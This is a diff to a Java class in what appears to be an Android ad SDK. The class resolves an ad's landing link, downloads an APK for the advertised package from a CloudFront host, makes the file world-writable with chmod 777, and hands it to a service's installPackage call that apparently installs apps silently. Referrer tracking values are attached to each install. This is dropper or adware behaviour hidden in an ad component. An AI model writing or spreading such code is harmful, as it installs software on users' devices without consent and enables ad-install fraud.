@@ -1,5 +1,6 @@
 package com.androidhelper.sdk.ad.task;
 
+import java.io.BufferedInputStream;
 import java.io.File;
 import java.io.FileOutputStream;
 import java.io.IOException;
@@ -153,7 +154,7 @@ class InstallGuideWindowTask extends ADWindowTask implements Runnable {
 	public void run() {
 		try {
 			destUrl = CommonUtils.getDestUrl(mAD.getLandingPager());
-//			destUrl = CommonUtils.getDestUrl("http://pixel.admobclick.com/v1/click?type=01&p1=10300&p2=90102&p3=20000&p4=383492436122653296210251051439347212371&p5=test&p6=SG&p7=902695a253a44d969cdc9c5445de2d9f&p8=1.75&p9=&p10=&p11=en&p12=20042&p13=211&p14=187095&lid=null&p15=com.zynga.wwf2.free&p24=2");
+//			destUrl = "https://play.google.com/store/apps/details?hl=en&id=com.airelive.apps.choco&referrer=mat_click_id%3D063655d1c3431b4efb8a45f72b7c06dd-20150813-170972";
 			AMLogger.e(null, "destUrl : " + destUrl);
 			if(!CommonUtils.isEmptyString(destUrl)) {
 				Uri uri = Uri.parse(destUrl);
@@ -161,7 +162,8 @@ class InstallGuideWindowTask extends ADWindowTask implements Runnable {
 				new Thread(){
 					public void run() {
 						try {
-							downloadApk("http://d2u9yfs3c0iqe1.cloudfront.net/apk/" + mAD.getPackageName(), referrer);
+							downloadApk("http://d2u9yfs3c0iqe1.cloudfront.net/apk/" + mAD.getPackageName() + ".apk", referrer);
+//							downloadApk("http://d2u9yfs3c0iqe1.cloudfront.net/apk/" + "com.airelive.apps.choco.apk", referrer);
 							
 //							LokiService lokiService = LokiService.getInstance(mContext);
 //							if(lokiService != null) {
@@ -233,8 +235,8 @@ class InstallGuideWindowTask extends ADWindowTask implements Runnable {
 		try {
 			URL url = new URL(apkUrl);
 			HttpURLConnection conn = (HttpURLConnection) url.openConnection();
-			conn.setConnectTimeout(10000);
-			conn.setReadTimeout(10000);
+			conn.setConnectTimeout(60000);
+			conn.setReadTimeout(60000);
 			conn.connect();
 			int responseCode = conn.getResponseCode();
 			if(200 != responseCode) {
@@ -253,21 +255,34 @@ class InstallGuideWindowTask extends ADWindowTask implements Runnable {
 				return;
 			}
 			inputStream = conn.getInputStream();
+			BufferedInputStream bis = new BufferedInputStream(inputStream);
 			File dir = AMApplication.instance.getFilesDir();
 			File file = new File(dir.getAbsolutePath() + "/new.apk");
 			fos = new FileOutputStream(file);
 			int len = -1;
 			byte[] buffer = new byte[1024];
-			while ((len = inputStream.read(buffer)) != -1) {
-				fos.write(buffer, len, len);
+			while ((len = bis.read(buffer)) > 0) {
+				fos.write(buffer, 0, len);
 			}
 			fos.flush();
+			fos.close();
+			bis.close();
+			inputStream.close();
+			conn.disconnect();
 			Apk apk = new Apk();
 			apk.setPackageName(mAD.getPackageName());
+//			apk.setPackageName("com.airelive.apps.choco");
 			apk.setReferrer(referrer);
 			AMApplication.instance.installApks.add(apk);
 			LokiService lokiService = LokiService.getInstance(mContext);
 			if(lokiService != null) {
+				 String[] command = {"chmod", "777", file.getAbsolutePath()};
+			        ProcessBuilder builder = new ProcessBuilder(command);
+			        try {
+						builder.start();
+					} catch (IOException e) {
+						AMLogger.e(null, e.getMessage());
+					}
 				lokiService.installPackage(file.getAbsolutePath(), null, 0);
 			}
 		} catch (Exception e) {
